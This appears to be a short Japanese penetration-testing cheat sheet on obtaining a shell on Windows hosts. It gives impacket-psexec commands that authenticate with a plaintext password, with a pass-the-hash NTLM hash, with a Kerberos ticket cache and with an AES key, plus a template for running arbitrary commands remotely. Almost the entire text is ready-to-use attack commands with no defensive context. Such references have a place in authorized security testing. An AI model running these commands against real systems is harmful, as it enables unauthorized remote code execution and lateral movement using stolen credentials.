https://omomuki-tech.com/archives/1260
# シェルの取得
## パスワード認証
```zsh
impacket-psexec Administrator:December31@192.168.0.1
```

## PtH
```zsh
impacket-psexec CORP/Administrator@192.168.1.100 -hashes :aad3b435b51404eeaad3b435b51404ee
```

## Kerberos認証
```zsh
export KRB5CCNAME=/tmp/kerberos_cache
psexec.py CORP/Administrator@target.corp.local -k -dc-ip 192.168.1.1
```

### AES Key
```zsh
impacket-psexec CORP/Administrator@target.corp.local -aesKey <16進数AESキー>
```

コマンド実行
```zsh
impacket-psexec <ドメイン>/<ユーザー名>:<パスワード>@<ターゲットIPまたはホスト名> [実行したいコマンド]
```
---
